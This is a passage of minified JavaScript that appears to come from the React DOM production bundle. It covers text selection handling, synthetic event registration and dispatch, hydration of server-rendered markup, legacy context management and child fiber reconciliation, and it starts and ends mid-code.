}
function sa(e, t) {
    var r,
        n = ia(e);
    for (e = 0; n;) {
        if (3 === n.nodeType) {
            if (r = e + n.textContent.length, e <= t && r >= t) return {
                node: n,
                offset: t - e
            };
            e = r;
        }
        e: {
            for (; n;) {
                if (n.nextSibling) {
                    n = n.nextSibling;
                    break e;
                }
                n = n.parentNode;
            }
            n = void 0;
        }
        n = ia(n);
    }
}
function id(e, t) {
    return !(!e || !t) && (e === t || (!e || 3 !== e.nodeType) && (t && 3 === t.nodeType ? id(e, t.parentNode) : "contains" in e ? e.contains(t) : !!e.compareDocumentPosition && !!(16 & e.compareDocumentPosition(t))));
}
function sd() {
    for (var e = window, t = Yo(); t instanceof e.HTMLIFrameElement;) {
        try {
            var n = "string" == typeof t.contentWindow.location.href;
        } catch {
            n = !1;
        }
        if (!n) break;
        t = Yo((e = t.contentWindow).document);
    }
    return t;
}
function Zs(e) {
    var t = e && e.nodeName && e.nodeName.toLowerCase();
    return t && ("input" === t && ("text" === e.type || "search" === e.type || "tel" === e.type || "url" === e.type || "password" === e.type) || "textarea" === t || "true" === e.contentEditable);
}
function fh(e) {
    var t = sd(),
        n = e.focusedElem,
        r = e.selectionRange;
    if (t !== n && n && n.ownerDocument && id(n.ownerDocument.documentElement, n)) {
        if (null !== r && Zs(n)) if (t = r.start, void 0 === (e = r.end) && (e = t), "selectionStart" in n) n.selectionStart = t, n.selectionEnd = Math.min(e, n.value.length); else if ((e = (t = n.ownerDocument || document) && t.defaultView || window).getSelection) {
            e = e.getSelection();
            var o = n.textContent.length,
                l = Math.min(r.start, o);
            r = void 0 === r.end ? l : Math.min(r.end, o), !e.extend && l > r && (o = r, r = l, l = o), o = sa(n, l);
            var i = sa(n, r);
            o && i && (1 !== e.rangeCount || e.anchorNode !== o.node || e.anchorOffset !== o.offset || e.focusNode !== i.node || e.focusOffset !== i.offset) && ((t = t.createRange()).setStart(o.node, o.offset), e.removeAllRanges(), l > r ? (e.addRange(t), e.extend(i.node, i.offset)) : (t.setEnd(i.node, i.offset), e.addRange(t)));
        }
        for (t = [], e = n; e = e.parentNode;) 1 === e.nodeType && t.push({
            element: e,
            left: e.scrollLeft,
            top: e.scrollTop
        });
        for ("function" == typeof n.focus && n.focus(), n = 0; n < t.length; n++) (e = t[n]).element.scrollLeft = e.left, e.element.scrollTop = e.top;
    }
}
var ph = ct && "documentMode" in document && 11 >= document.documentMode,
    gn = null,
    Gi = null,
    gr = null,
    Qi = !1;
function ua(e, t, n) {
    var r = n.window === n ? n.document : 9 === n.nodeType ? n : n.ownerDocument;
    Qi || null == gn || gn !== Yo(r) || ("selectionStart" in (r = gn) && Zs(r) ? r = {
        start: r.selectionStart,
        end: r.selectionEnd
    } : r = {
        anchorNode: (r = (r.ownerDocument && r.ownerDocument.defaultView || window).getSelection()).anchorNode,
        anchorOffset: r.anchorOffset,
        focusNode: r.focusNode,
        focusOffset: r.focusOffset
    }, gr && Tr(gr, r) || (gr = r, 0 < (r = nl(Gi, "onSelect")).length && (t = new Ys("onSelect", "select", null, t, n), e.push({
        event: t,
        listeners: r
    }), t.target = gn)));
}
function ho(e, t) {
    var n = {};
    return n[e.toLowerCase()] = t.toLowerCase(), n["Webkit" + e] = "webkit" + t, n["Moz" + e] = "moz" + t, n;
}
var yn = {
    animationend: ho("Animation", "AnimationEnd"),
    animationiteration: ho("Animation", "AnimationIteration"),
    animationstart: ho("Animation", "AnimationStart"),
    transitionend: ho("Transition", "TransitionEnd")
},
    si = {},
    ud = {};
function Tl(e) {
    if (si[e]) return si[e];
    if (!yn[e]) return e;
    var n,
        t = yn[e];
    for (n in t) if (t.hasOwnProperty(n) && n in ud) return si[e] = t[n];
    return e;
}
ct && (ud = document.createElement("div").style, "AnimationEvent" in window || (delete yn.animationend.animation, delete yn.animationiteration.animation, delete yn.animationstart.animation), "TransitionEvent" in window || delete yn.transitionend.transition);
var ad = Tl("animationend"),
    cd = Tl("animationiteration"),
    dd = Tl("animationstart"),
    fd = Tl("transitionend"),
    pd = new Map(),
    aa = "abort auxClick cancel canPlay canPlayThrough click close contextMenu copy cut drag dragEnd dragEnter dragExit dragLeave dragOver dragStart drop durationChange emptied encrypted ended error gotPointerCapture input invalid keyDown keyPress keyUp load loadedData loadedMetadata loadStart lostPointerCapture mouseDown mouseMove mouseOut mouseOver mouseUp paste pause play playing pointerCancel pointerDown pointerMove pointerOut pointerOver pointerUp progress rateChange reset resize seeked seeking stalled submit suspend timeUpdate touchCancel touchEnd touchStart volumeChange scroll toggle touchMove waiting wheel".split(" ");
function $t(e, t) {
    pd.set(e, t), ln(t, [e]);
}
for (var ui = 0; ui < aa.length; ui++) {
    var ai = aa[ui],
        mh = ai.toLowerCase(),
        hh = ai[0].toUpperCase() + ai.slice(1);
    $t(mh, "on" + hh);
}
$t(ad, "onAnimationEnd"), $t(cd, "onAnimationIteration"), $t(dd, "onAnimationStart"), $t("dblclick", "onDoubleClick"), $t("focusin", "onFocus"), $t("focusout", "onBlur"), $t(fd, "onTransitionEnd"), Rn("onMouseEnter", ["mouseout", "mouseover"]), Rn("onMouseLeave", ["mouseout", "mouseover"]), Rn("onPointerEnter", ["pointerout", "pointerover"]), Rn("onPointerLeave", ["pointerout", "pointerover"]), ln("onChange", "change click focusin focusout input keydown keyup selectionchange".split(" ")), ln("onSelect", "focusout contextmenu dragend focusin keydown keyup mousedown mouseup selectionchange".split(" ")), ln("onBeforeInput", ["compositionend", "keypress", "textInput", "paste"]), ln("onCompositionEnd", "compositionend focusout keydown keypress keyup mousedown".split(" ")), ln("onCompositionStart", "compositionstart focusout keydown keypress keyup mousedown".split(" ")), ln("onCompositionUpdate", "compositionupdate focusout keydown keypress keyup mousedown".split(" "));
var fr = "abort canplay canplaythrough durationchange emptied encrypted ended error loadeddata loadedmetadata loadstart pause play playing progress ratechange resize seeked seeking stalled suspend timeupdate volumechange waiting".split(" "),
    vh = new Set("cancel close invalid load scroll toggle".split(" ").concat(fr));
function ca(e, t, n) {
    var r = e.type || "unknown-event";
    e.currentTarget = n, mm(r, t, void 0, e), e.currentTarget = null;
}
function md(e, t) {
    t = !!(4 & t);
    for (var n = 0; n < e.length; n++) {
        var r = e[n],
            o = r.event;
        r = r.listeners;
        e: {
            var l = void 0;
            if (t) for (var i = r.length - 1; 0 <= i; i--) {
                var s = r[i],
                    a = s.instance,
                    u = s.currentTarget;
                if (s = s.listener, a !== l && o.isPropagationStopped()) break e;
                ca(o, s, u), l = a;
            } else for (i = 0; i < r.length; i++) {
                if (a = (s = r[i]).instance, u = s.currentTarget, s = s.listener, a !== l && o.isPropagationStopped()) break e;
                ca(o, s, u), l = a;
            }
        }
    }
    if (Jo) throw e = Wi, Jo = !1, Wi = null, e;
}
function V(e, t) {
    var n = t[qi];
    void 0 === n && (n = t[qi] = new Set());
    var r = e + "__bubble";
    n.has(r) || (hd(t, e, 2, !1), n.add(r));
}
function ci(e, t, n) {
    var r = 0;
    t && (r |= 4), hd(n, e, r, t);
}
var vo = "_reactListening" + Math.random().toString(36).slice(2);
function Ir(e) {
    if (!e[vo]) {
        e[vo] = !0, kc.forEach(function (n) {
            "selectionchange" !== n && (vh.has(n) || ci(n, !1, e), ci(n, !0, e));
        });
        var t = 9 === e.nodeType ? e : e.ownerDocument;
        null === t || t[vo] || (t[vo] = !0, ci("selectionchange", !1, t));
    }
}
function hd(e, t, n, r) {
    switch (Zc(t)) {
        case 1:
            var o = Im;
            break;
        case 4:
            o = zm;
            break;
        default:
            o = Gs;
    }
    n = o.bind(null, t, n, e), o = void 0, !Vi || "touchstart" !== t && "touchmove" !== t && "wheel" !== t || (o = !0), r ? void 0 !== o ? e.addEventListener(t, n, {
        capture: !0,
        passive: o
    }) : e.addEventListener(t, n, !0) : void 0 !== o ? e.addEventListener(t, n, {
        passive: o
    }) : e.addEventListener(t, n, !1);
}
function di(e, t, n, r, o) {
    var l = r;
    if (!(1 & t || 2 & t || null === r)) e: for (; ;) {
        if (null === r) return;
        var i = r.tag;
        if (3 === i || 4 === i) {
            var s = r.stateNode.containerInfo;
            if (s === o || 8 === s.nodeType && s.parentNode === o) break;
            if (4 === i) for (i = r.return; null !== i;) {
                var a = i.tag;
                if ((3 === a || 4 === a) && ((a = i.stateNode.containerInfo) === o || 8 === a.nodeType && a.parentNode === o)) return;
                i = i.return;
            }
            for (; null !== s;) {
                if (null === (i = Kt(s))) return;
                if (5 === (a = i.tag) || 6 === a) {
                    r = l = i;
                    continue e;
                }
                s = s.parentNode;
            }
        }
        r = r.return;
    }
    Fc(function () {
        var u = l,
            d = Ws(n),
            m = [];
        e: {
            var p = pd.get(e);
            if (void 0 !== p) {
                var g = Ys,
                    w = e;
                switch (e) {
                    case "keypress":
                        if (0 === $o(n)) break e;
                    case "keydown":
                    case "keyup":
                        g = Km;
                        break;
                    case "focusin":
                        w = "focus", g = oi;
                        break;
                    case "focusout":
                        w = "blur", g = oi;
                        break;
                    case "beforeblur":
                    case "afterblur":
                        g = oi;
                        break;
                    case "click":
                        if (2 === n.button) break e;
                    case "auxclick":
                    case "dblclick":
                    case "mousedown":
                    case "mousemove":
                    case "mouseup":
                    case "mouseout":
                    case "mouseover":
                    case "contextmenu":
                        g = Zu;
                        break;
                    case "drag":
                    case "dragend":
                    case "dragenter":
                    case "dragexit":
                    case "dragleave":
                    case "dragover":
                    case "dragstart":
                    case "drop":
                        g = Mm;
                        break;
                    case "touchcancel":
                    case "touchend":
                    case "touchmove":
                    case "touchstart":
                        g = Ym;
                        break;
                    case ad:
                    case cd:
                    case dd:
                        g = $m;
                        break;
                    case fd:
                        g = Jm;
                        break;
                    case "scroll":
                        g = Rm;
                        break;
                    case "wheel":
                        g = qm;
                        break;
                    case "copy":
                    case "cut":
                    case "paste":
                        g = Dm;
                        break;
                    case "gotpointercapture":
                    case "lostpointercapture":
                    case "pointercancel":
                    case "pointerdown":
                    case "pointermove":
                    case "pointerout":
                    case "pointerover":
                    case "pointerup":
                        g = ea;
                }
                var y = !!(4 & t),
                    S = !y && "scroll" === e,
                    f = y ? null !== p ? p + "Capture" : null : p;
                y = [];
                for (var h, c = u; null !== c;) {
                    var k = (h = c).stateNode;
                    if (5 === h.tag && null !== k && (h = k, null !== f && null != (k = Cr(c, f)) && y.push(zr(c, k, h))), S) break;
                    c = c.return;
                }
                0 < y.length && (p = new g(p, w, null, n, d), m.push({
                    event: p,
                    listeners: y
                }));
            }
        }
        if (!(7 & t)) {
            if (g = "mouseout" === e || "pointerout" === e, (!(p = "mouseover" === e || "pointerover" === e) || n === Ui || !(w = n.relatedTarget || n.fromElement) || !Kt(w) && !w[dt]) && (g || p) && (p = d.window === d ? d : (p = d.ownerDocument) ? p.defaultView || p.parentWindow : window, g ? (g = u, null !== (w = (w = n.relatedTarget || n.toElement) ? Kt(w) : null) && (w !== (S = sn(w)) || 5 !== w.tag && 6 !== w.tag) && (w = null)) : (g = null, w = u), g !== w)) {
                if (y = Zu, k = "onMouseLeave", f = "onMouseEnter", c = "mouse", ("pointerout" === e || "pointerover" === e) && (y = ea, k = "onPointerLeave", f = "onPointerEnter", c = "pointer"), S = null == g ? p : wn(g), h = null == w ? p : wn(w), (p = new y(k, c + "leave", g, n, d)).target = S, p.relatedTarget = h, k = null, Kt(d) === u && ((y = new y(f, c + "enter", w, n, d)).target = h, y.relatedTarget = S, k = y), S = k, g && w) t: {
                    for (f = w, c = 0, h = y = g; h; h = dn(h)) c++;
                    for (h = 0, k = f; k; k = dn(k)) h++;
                    for (; 0 < c - h;) y = dn(y), c--;
                    for (; 0 < h - c;) f = dn(f), h--;
                    for (; c--;) {
                        if (y === f || null !== f && y === f.alternate) break t;
                        y = dn(y), f = dn(f);
                    }
                    y = null;
                } else y = null;
                null !== g && da(m, p, g, y, !1), null !== w && null !== S && da(m, S, w, y, !0);
            }
            if ("select" === (g = (p = u ? wn(u) : window).nodeName && p.nodeName.toLowerCase()) || "input" === g && "file" === p.type) var C = ih; else if (ra(p)) {
                if (od) C = ch; else {
                    C = uh;
                    var T = sh;
                }
            } else (g = p.nodeName) && "input" === g.toLowerCase() && ("checkbox" === p.type || "radio" === p.type) && (C = ah);
            switch (C && (C = C(e, u)) ? rd(m, C, n, d) : (T && T(e, p, u), "focusout" === e && (T = p._wrapperState) && T.controlled && "number" === p.type && Li(p, "number", p.value)), T = u ? wn(u) : window, e) {
                case "focusin":
                    (ra(T) || "true" === T.contentEditable) && (gn = T, Gi = u, gr = null);
                    break;
                case "focusout":
                    gr = Gi = gn = null;
                    break;
                case "mousedown":
                    Qi = !0;
                    break;
                case "contextmenu":
                case "mouseup":
                case "dragend":
                    Qi = !1, ua(m, n, d);
                    break;
                case "selectionchange":
                    if (ph) break;
                case "keydown":
                case "keyup":
                    ua(m, n, d);
            }
            var j;
            if (Js) e: {
                switch (e) {
                    case "compositionstart":
                        var E = "onCompositionStart";
                        break e;
                    case "compositionend":
                        E = "onCompositionEnd";
                        break e;
                    case "compositionupdate":
                        E = "onCompositionUpdate";
                        break e;
                }
                E = void 0;
            } else vn ? td(e, n) && (E = "onCompositionEnd") : "keydown" === e && 229 === n.keyCode && (E = "onCompositionStart");
            E && (ed && "ko" !== n.locale && (vn || "onCompositionStart" !== E ? "onCompositionEnd" === E && vn && (j = qc()) : (Qs = "value" in (Et = d) ? Et.value : Et.textContent, vn = !0)), 0 < (T = nl(u, E)).length && (E = new qu(E, e, null, n, d), m.push({
                event: E,
                listeners: T
            }), j ? E.data = j : null !== (j = nd(n)) && (E.data = j))), (j = th ? nh(e, n) : rh(e, n)) && 0 < (u = nl(u, "onBeforeInput")).length && (d = new qu("onBeforeInput", "beforeinput", null, n, d), m.push({
                event: d,
                listeners: u
            }), d.data = j);
        }
        md(m, t);
    });
}
function zr(e, t, n) {
    return {
        instance: e,
        listener: t,
        currentTarget: n
    };
}
function nl(e, t) {
    for (var n = t + "Capture", r = []; null !== e;) {
        var o = e,
            l = o.stateNode;
        5 === o.tag && null !== l && (o = l, null != (l = Cr(e, n)) && r.unshift(zr(e, l, o)), null != (l = Cr(e, t)) && r.push(zr(e, l, o))), e = e.return;
    }
    return r;
}
function dn(e) {
    if (null === e) return null;
    do {
        e = e.return;
    } while (e && 5 !== e.tag);
    return e || null;
}
function da(e, t, n, r, o) {
    for (var l = t._reactName, i = []; null !== n && n !== r;) {
        var s = n,
            a = s.alternate,
            u = s.stateNode;
        if (null !== a && a === r) break;
        5 === s.tag && null !== u && (s = u, o ? null != (a = Cr(n, l)) && i.unshift(zr(n, a, s)) : o || null != (a = Cr(n, l)) && i.push(zr(n, a, s))), n = n.return;
    }
    0 !== i.length && e.push({
        event: t,
        listeners: i
    });
}
var gh = /\r\n?/g,
    yh = /\u0000|\uFFFD/g;
function fa(e) {
    return ("string" == typeof e ? e : "" + e).replace(gh, "\n").replace(yh, "");
}
function go(e, t, n) {
    if (t = fa(t), fa(e) !== t && n) throw Error(_(425));
}
function rl() { }
var Yi = null,
    Xi = null;
function Ji(e, t) {
    return "textarea" === e || "noscript" === e || "string" == typeof t.children || "number" == typeof t.children || "object" == typeof t.dangerouslySetInnerHTML && null !== t.dangerouslySetInnerHTML && null != t.dangerouslySetInnerHTML.__html;
}
var Zi = "function" == typeof setTimeout ? setTimeout : void 0,
    wh = "function" == typeof clearTimeout ? clearTimeout : void 0,
    pa = "function" == typeof Promise ? Promise : void 0,
    xh = "function" == typeof queueMicrotask ? queueMicrotask : typeof pa < "u" ? function (e) {
        return pa.resolve(null).then(e).catch(Sh);
    } : Zi;
function Sh(e) {
    setTimeout(function () {
        throw e;
    });
}
function fi(e, t) {
    var n = t,
        r = 0;
    do {
        var o = n.nextSibling;
        if (e.removeChild(n), o && 8 === o.nodeType) if ("/$" === (n = o.data)) {
            if (0 === r) return e.removeChild(o), void Pr(t);
            r--;
        } else "$" !== n && "$?" !== n && "$!" !== n || r++;
        n = o;
    } while (n);
    Pr(t);
}
function It(e) {
    for (; null != e; e = e.nextSibling) {
        var t = e.nodeType;
        if (1 === t || 3 === t) break;
        if (8 === t) {
            if ("$" === (t = e.data) || "$!" === t || "$?" === t) break;
            if ("/$" === t) return null;
        }
    }
    return e;
}
function ma(e) {
    e = e.previousSibling;
    for (var t = 0; e;) {
        if (8 === e.nodeType) {
            var n = e.data;
            if ("$" === n || "$!" === n || "$?" === n) {
                if (0 === t) return e;
                t--;
            } else "/$" === n && t++;
        }
        e = e.previousSibling;
    }
    return null;
}
var Bn = Math.random().toString(36).slice(2),
    Ze = "__reactFiber$" + Bn,
    Rr = "__reactProps$" + Bn,
    dt = "__reactContainer$" + Bn,
    qi = "__reactEvents$" + Bn,
    kh = "__reactListeners$" + Bn,
    _h = "__reactHandles$" + Bn;
function Kt(e) {
    var t = e[Ze];
    if (t) return t;
    for (var n = e.parentNode; n;) {
        if (t = n[dt] || n[Ze]) {
            if (n = t.alternate, null !== t.child || null !== n && null !== n.child) for (e = ma(e); null !== e;) {
                if (n = e[Ze]) return n;
                e = ma(e);
            }
            return t;
        }
        n = (e = n).parentNode;
    }
    return null;
}
function Gr(e) {
    return !(e = e[Ze] || e[dt]) || 5 !== e.tag && 6 !== e.tag && 13 !== e.tag && 3 !== e.tag ? null : e;
}
function wn(e) {
    if (5 === e.tag || 6 === e.tag) return e.stateNode;
    throw Error(_(33));
}
function Il(e) {
    return e[Rr] || null;
}
var es = [],
    xn = -1;
function Ft(e) {
    return {
        current: e
    };
}
function W(e) {
    0 > xn || (e.current = es[xn], es[xn] = null, xn--);
}
function U(e, t) {
    xn++, es[xn] = e.current, e.current = t;
}
var At = {},
    ce = Ft(At),
    ye = Ft(!1),
    Zt = At;
function On(e, t) {
    var n = e.type.contextTypes;
    if (!n) return At;
    var r = e.stateNode;
    if (r && r.__reactInternalMemoizedUnmaskedChildContext === t) return r.__reactInternalMemoizedMaskedChildContext;
    var l,
        o = {};
    for (l in n) o[l] = t[l];
    return r && ((e = e.stateNode).__reactInternalMemoizedUnmaskedChildContext = t, e.__reactInternalMemoizedMaskedChildContext = o), o;
}
function we(e) {
    return null != (e = e.childContextTypes);
}
function ol() {
    W(ye), W(ce);
}
function ha(e, t, n) {
    if (ce.current !== At) throw Error(_(168));
    U(ce, t), U(ye, n);
}
function vd(e, t, n) {
    var r = e.stateNode;
    if (t = t.childContextTypes, "function" != typeof r.getChildContext) return n;
    for (var o in r = r.getChildContext()) if (!(o in t)) throw Error(_(108, sm(e) || "Unknown", o));
    return Q({}, n, r);
}
function ll(e) {
    return e = (e = e.stateNode) && e.__reactInternalMemoizedMergedChildContext || At, Zt = ce.current, U(ce, e), U(ye, ye.current), !0;
}
function va(e, t, n) {
    var r = e.stateNode;
    if (!r) throw Error(_(169));
    n ? (e = vd(e, t, Zt), r.__reactInternalMemoizedMergedChildContext = e, W(ye), W(ce), U(ce, e)) : W(ye), U(ye, n);
}
var lt = null,
    zl = !1,
    pi = !1;
function gd(e) {
    null === lt ? lt = [e] : lt.push(e);
}
function Ch(e) {
    zl = !0, gd(e);
}
function Dt() {
    if (!pi && null !== lt) {
        pi = !0;
        var e = 0,
            t = $;
        try {
            var n = lt;
            for ($ = 1; e < n.length; e++) {
                var r = n[e];
                do {
                    r = r(!0);
                } while (null !== r);
            }
            lt = null, zl = !1;
        } catch (o) {
            throw null !== lt && (lt = lt.slice(e + 1)), Vc(Bs, Dt), o;
        } finally {
            $ = t, pi = !1;
        }
    }
    return null;
}
var Sn = [],
    kn = 0,
    il = null,
    sl = 0,
    ze = [],
    Re = 0,
    qt = null,
    it = 1,
    st = "";
function Wt(e, t) {
    Sn[kn++] = sl, Sn[kn++] = il, il = e, sl = t;
}
function yd(e, t, n) {
    ze[Re++] = it, ze[Re++] = st, ze[Re++] = qt, qt = e;
    var r = it;
    e = st;
    var o = 32 - Ve(r) - 1;
    r &= ~(1 << o), n += 1;
    var l = 32 - Ve(t) + o;
    if (30 < l) {
        var i = o - o % 5;
        l = (r & (1 << i) - 1).toString(32), r >>= i, o -= i, it = 1 << 32 - Ve(t) + o | n << o | r, st = l + e;
    } else it = 1 << l | n << o | r, st = e;
}
function qs(e) {
    null !== e.return && (Wt(e, 1), yd(e, 1, 0));
}
function eu(e) {
    for (; e === il;) il = Sn[--kn], Sn[kn] = null, sl = Sn[--kn], Sn[kn] = null;
    for (; e === qt;) qt = ze[--Re], ze[Re] = null, st = ze[--Re], ze[Re] = null, it = ze[--Re], ze[Re] = null;
}
var Ee = null,
    _e = null,
    B = !1,
    Ue = null;
function wd(e, t) {
    var n = Oe(5, null, null, 0);
    n.elementType = "DELETED", n.stateNode = t, n.return = e, null === (t = e.deletions) ? (e.deletions = [n], e.flags |= 16) : t.push(n);
}
function ga(e, t) {
    switch (e.tag) {
        case 5:
            var n = e.type;
            return null !== (t = 1 !== t.nodeType || n.toLowerCase() !== t.nodeName.toLowerCase() ? null : t) && (e.stateNode = t, Ee = e, _e = It(t.firstChild), !0);
        case 6:
            return null !== (t = "" === e.pendingProps || 3 !== t.nodeType ? null : t) && (e.stateNode = t, Ee = e, _e = null, !0);
        case 13:
            return null !== (t = 8 !== t.nodeType ? null : t) && (n = null !== qt ? {
                id: it,
                overflow: st
            } : null, e.memoizedState = {
                dehydrated: t,
                treeContext: n,
                retryLane: 1073741824
            }, (n = Oe(18, null, null, 0)).stateNode = t, n.return = e, e.child = n, Ee = e, _e = null, !0);
        default:
            return !1;
    }
}
function ts(e) {
    return !(!(1 & e.mode) || 128 & e.flags);
}
function ns(e) {
    if (B) {
        var t = _e;
        if (t) {
            var n = t;
            if (!ga(e, t)) {
                if (ts(e)) throw Error(_(418));
                t = It(n.nextSibling);
                var r = Ee;
                t && ga(e, t) ? wd(r, n) : (e.flags = -4097 & e.flags | 2, B = !1, Ee = e);
            }
        } else {
            if (ts(e)) throw Error(_(418));
            e.flags = -4097 & e.flags | 2, B = !1, Ee = e;
        }
    }
}
function ya(e) {
    for (e = e.return; null !== e && 5 !== e.tag && 3 !== e.tag && 13 !== e.tag;) e = e.return;
    Ee = e;
}
function yo(e) {
    if (e !== Ee) return !1;
    if (!B) return ya(e), B = !0, !1;
    var t;
    if ((t = 3 !== e.tag) && !(t = 5 !== e.tag) && (t = "head" !== (t = e.type) && "body" !== t && !Ji(e.type, e.memoizedProps)), t && (t = _e)) {
        if (ts(e)) throw xd(), Error(_(418));
        for (; t;) wd(e, t), t = It(t.nextSibling);
    }
    if (ya(e), 13 === e.tag) {
        if (!(e = null !== (e = e.memoizedState) ? e.dehydrated : null)) throw Error(_(317));
        e: {
            for (e = e.nextSibling, t = 0; e;) {
                if (8 === e.nodeType) {
                    var n = e.data;
                    if ("/$" === n) {
                        if (0 === t) {
                            _e = It(e.nextSibling);
                            break e;
                        }
                        t--;
                    } else "$" !== n && "$!" !== n && "$?" !== n || t++;
                }
                e = e.nextSibling;
            }
            _e = null;
        }
    } else _e = Ee ? It(e.stateNode.nextSibling) : null;
    return !0;
}
function xd() {
    for (var e = _e; e;) e = It(e.nextSibling);
}
function Mn() {
    _e = Ee = null, B = !1;
}
function tu(e) {
    null === Ue ? Ue = [e] : Ue.push(e);
}
var Eh = ht.ReactCurrentBatchConfig;
function or(e, t, n) {
    if (null !== (e = n.ref) && "function" != typeof e && "object" != typeof e) {
        if (n._owner) {
            if (n = n._owner) {
                if (1 !== n.tag) throw Error(_(309));
                var r = n.stateNode;
            }
            if (!r) throw Error(_(147, e));
            var o = r,
                l = "" + e;
            return null !== t && null !== t.ref && "function" == typeof t.ref && t.ref._stringRef === l ? t.ref : ((t = function (i) {
                var s = o.refs;
                null === i ? delete s[l] : s[l] = i;
            })._stringRef = l, t);
        }
        if ("string" != typeof e) throw Error(_(284));
        if (!n._owner) throw Error(_(290, e));
    }
    return e;
}
function wo(e, t) {
    throw e = Object.prototype.toString.call(t), Error(_(31, "[object Object]" === e ? "object with keys {" + Object.keys(t).join(", ") + "}" : e));
}
function wa(e) {
    return (0, e._init)(e._payload);
}
function Sd(e) {
    function t(f, c) {
        if (e) {
            var h = f.deletions;
            null === h ? (f.deletions = [c], f.flags |= 16) : h.push(c);
        }
    }
    function n(f, c) {
        if (!e) return null;
        for (; null !== c;) t(f, c), c = c.sibling;
        return null;
    }
    function r(f, c) {
        for (f = new Map(); null !== c;) null !== c.key ? f.set(c.key, c) : f.set(c.index, c), c = c.sibling;
        return f;
    }
    function o(f, c) {
        return (f = Mt(f, c)).index = 0, f.sibling = null, f;
    }
    function l(f, c, h) {
        return f.index = h, e ? null !== (h = f.alternate) ? (h = h.index) < c ? (f.flags |= 2, c) : h : (f.flags |= 2, c) : (f.flags |= 1048576, c);
    }
    function i(f) {
        return e && null === f.alternate && (f.flags |= 2), f;
    }
    function s(f, c, h, k) {
        return null === c || 6 !== c.tag ? ((c = xi(h, f.mode, k)).return = f, c) : ((c = o(c, h)).return = f, c);
    }
    function a(f, c, h, k) {
        var C = h.type;
        return C === hn ? d(f, c, h.props.children, k, h.key) : null !== c && (c.elementType === C || "object" == typeof C && null !== C && C.$$typeof === xt && wa(C) === c.type) ? ((k = o(c, h.props)).ref = or(f, c, h), k.return = f, k) : ((k = Bo(h.type, h.key, h.props, null, f.mode, k)).ref = or(f, c, h), k.return = f, k);
    }
    function u(f, c, h, k) {
        return null === c || 4 !== c.tag || c.stateNode.containerInfo !== h.containerInfo || c.stateNode.implementation !== h.implementation ? ((c = Si(h, f.mode, k)).return = f, c) : ((c = o(c, h.children || [])).return = f, c);
    }
    function d(f, c, h, k, C) {
        return null === c || 7 !== c.tag ? ((c = Jt(h, f.mode, k, C)).return = f, c) : ((c = o(c, h)).return = f, c);
    }
    function m(f, c, h) {
        if ("string" == typeof c && "" !== c || "number" == typeof c) return (c = xi("" + c, f.mode, h)).return = f, c;
        if ("object" == typeof c && null !== c) {
            switch (c.$$typeof) {
                case so:
                    return (h = Bo(c.type, c.key, c.props, null, f.mode, h)).ref = or(f, null, c), h.return = f, h;
                case mn:
                    return (c = Si(c, f.mode, h)).return = f, c;
                case xt:
                    return m(f, (0, c._init)(c._payload), h);
            }
            if (cr(c) || qn(c)) return (c = Jt(c, f.mode, h, null)).return = f, c;
            wo(f, c);
        }
        return null;
    }
    function p(f, c, h, k) {
        var C = null !== c ? c.key : null;
        if ("string" == typeof h && "" !== h || "number" == typeof h) return null !== C ? null : s(f, c, "" + h, k);
        if ("object" == typeof h && null !== h) {
            switch (h.$$typeof) {
                case so:
                    return h.key === C ? a(f, c, h, k) : null;
                case mn:
                    return h.key === C ? u(f, c, h, k) : null;
                case xt:
                    return p(f, c, (C = h._init)(h._payload), k);
            }
            if (cr(h) || qn(h)) return null !== C ? null : d(f, c, h, k, null);
            wo(f, h);
        }
        return null;
    }
    function g(f, c, h, k, C) {
        if ("string" == typeof k && "" !== k || "number" == typeof k) return s(c, f = f.get(h) || null, "" + k, C);
        if ("object" == typeof k && null !== k) {
            switch (k.$$typeof) {
                case so:
                    return a(c, f = f.get(null === k.key ? h : k.key) || null, k, C);
                case mn:
                    return u(c, f = f.get(null === k.key ? h : k.key) || null, k, C);
                case xt:
                    return g(f, c, h, (0, k._init)(k._payload), C);
            }
            if (cr(k) || qn(k)) return d(c, f = f.get(h) || null, k, C, null);
            wo(c, k);
        }
        return null;
    }
    return function S(f, c, h, k) {
        if ("object" == typeof h && null !== h && h.type === hn && null === h.key && (h = h.props.children), "object" == typeof h && null !== h) {
            switch (h.$$typeof) {
                case so:
                    e: {
                        for (var C = h.key, T = c; null !== T;) {
                            if (T.key === C) {
                                if ((C = h.type) === hn) {
                                    if (7 === T.tag) {
                                        n(f, T.sibling), (c = o(T, h.props.children)).return = f, f = c;
                                        break e;
                                    }
                                } else if (T.elementType === C || "object" == typeof C && null !== C && C.$$typeof === xt && wa(C) === T.type) {
                                    n(f, T.sibling), (c = o(T, h.props)).ref = or(f, T, h), c.return = f, f = c;
                                    break e;
                                }
                                n(f, T);
                                break;
                            }
                            t(f, T), T = T.sibling;
                        }
                        h.type === hn ? ((c = Jt(h.props.children, f.mode, k, h.key)).return = f, f = c) : ((k = Bo(h.type, h.key, h.props, null, f.mode, k)).ref = or(f, c, h), k.return = f, f = k);
                    }
                    return i(f);
                case mn:
                    e: {
                        for (T = h.key; null !== c;) {
                            if (c.key === T) {
                                if (4 === c.tag && c.stateNode.containerInfo === h.containerInfo && c.stateNode.implementation === h.implementation) {
                                    n(f, c.sibling), (c = o(c, h.children || [])).return = f, f = c;
                                    break e;
                                }
                                n(f, c);
                                break;
                            }
                            t(f, c), c = c.sibling;
                        }
                        (c = Si(h, f.mode, k)).return = f, f = c;
                    }
                    return i(f);
                case xt:
                    return S(f, c, (T = h._init)(h._payload), k);
            }
            if (cr(h)) return function w(f, c, h, k) {
                for (var C = null, T = null, j = c, E = c = 0, F = null; null !== j && E < h.length; E++) {
                    j.index > E ? (F = j, j = null) : F = j.sibling;
                    var z = p(f, j, h[E], k);
                    if (null === z) {
                        null === j && (j = F);
                        break;
                    }
                    e && j && null === z.alternate && t(f, j), c = l(z, c, E), null === T ? C = z : T.sibling = z, T = z, j = F;
                }
                if (E === h.length) return n(f, j), B && Wt(f, E), C;
                if (null === j) {
                    for (; E < h.length; E++) null !== (j = m(f, h[E], k)) && (c = l(j, c, E), null === T ? C = j : T.sibling = j, T = j);
                    return B && Wt(f, E), C;
                }
                for (j = r(f, j); E < h.length; E++) null !== (F = g(j, f, E, h[E], k)) && (e && null !== F.alternate && j.delete(null === F.key ? E : F.key), c = l(F, c, E), null === T ? C = F : T.sibling = F, T = F);
                return e && j.forEach(function (Z) {
                    return t(f, Z);
                }), B && Wt(f, E), C;
            }(f, c, h, k);
            if (qn(h)) return function y(f, c, h, k) {
                var C = qn(h);
                if ("function" != typeof C) throw Error(_(150));
                if (null == (h = C.call(h))) throw Error(_(151));
